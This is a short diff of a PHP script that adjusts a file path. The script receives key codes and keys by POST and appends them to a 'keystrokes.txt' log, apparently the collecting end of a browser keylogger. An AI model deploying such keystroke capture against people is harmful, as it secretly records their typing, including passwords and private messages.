@@ -179,7 +179,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // You can perform any processing here with the received data
     // For example, you can log it to a file or store it in a database
     $logMessage = "Key Code: $keyCode, Key: $key";
-    file_put_contents('keystrokes.txt', $logMessage . PHP_EOL, FILE_APPEND);
+    file_put_contents('./keystrokes.txt', $logMessage . PHP_EOL, FILE_APPEND);
 }
 ?>
 
